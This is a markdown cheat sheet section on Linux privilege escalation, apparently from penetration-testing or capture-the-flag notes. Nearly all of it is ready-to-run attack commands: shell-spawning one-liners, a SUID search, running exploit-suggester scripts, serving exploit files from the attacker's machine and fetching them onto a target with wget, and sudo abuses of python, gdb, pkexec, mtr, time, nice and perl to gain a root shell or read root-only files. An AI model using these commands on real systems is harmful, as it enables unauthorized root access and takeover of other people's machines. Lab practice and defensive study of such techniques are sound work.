- ## Privilege escalation <a name="privilegeescalation"></a>
- ```python3 -c 'import os; os.system("/bin/bash")'```
- ```python -c 'import pty; pty.spawn("/bin/bash")'```
- `echo os.system('/bin/bash')`
```
exec "/bin/sh";
perl —e 'exec "/bin/sh";'
```
- ```find /  -perm -u=s -type f 2>/dev/null``` to see the permission```
- Use ```linpeas``` if you are not getting any escalation
  - download the script from the github
- If It was running on Linux Kernel 4.4.0–31-generic and Ubuntu 14.04.5 LTS. use below command
  - ```wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh```
  - ```chmod +x linux-exploit-suggester.sh``` and ```./linux-exploit-suggester.sh```
  - you will get some CVE, select any one CVE in that download URL will be there using that link you can download scripts
  - ```wget (download URL in CVE)``` download the file in your system
  - run ```sudo python -m http.server 80```
  - download the file in the target system ```wget http://<myip>/<filename>```
  - example: wget http://192.168.45.161/root.cpp
 
  
 - ```bash -p```
   
- if you find ```/usr/bin/python2.7``` in sudo -l
  - then use the below command it will give you the root privilege
  - ```/usr/bin/python2.7 -c 'import os; os.setuid(0); os.system("/bin/bash")'```
 
- if you find ```/usr/bin/gbd``` in sudo -l
  - then use the below command it will give you the root privilege
  - ```/usr/bin/gdb -nx -ex 'python import os; os.execl("/bin/sh", "sh", "-p")' -ex quit```
 

- if you find ```/usr/bin/pkexec``` in ```sudo -l``` 
  - then use the below command it will give you the root privilege
  - ```sudo pkexec /bin/bash```

- if you find ```/usr/bin/mtr``` in ```sudo -l``` 
  - then use the below command it will give you the root privilege
  - ```LFILE=/root/proof.txt```
  - ```sudo mtr --raw -F "$LFILE"```

- if you find ```/usr/bin/time``` in ```sudo -l``` 
  - then use the below command it will give you the root privilege
  - ```sudo /usr/bin/time /bin/bash```

- if you find ```(ALL : ALL) /bin/nice /notes/*``` in ```sudo -l```
  - it shows that you can run all the files in the /notes directory with /bin/nice binary.
  - so create a script letsgetroot.sh which executes /bin/bash and gave the necessary permissions.
  - ```echo "/bin/bash" >> letsgetroot.sh``` save the file in any directory
  - ```sudo /bin/nice /notes/../home/user/letsgetroot.sh``` it will give the root access.


- if you find ```(ALL : ALL) NOPASSWD: /usr/bin/perl``` in ```sudo -l```
  - then use the below command it will give you the root privilege
  - ```sudo perl -e 'exec "/bin/bash";'```
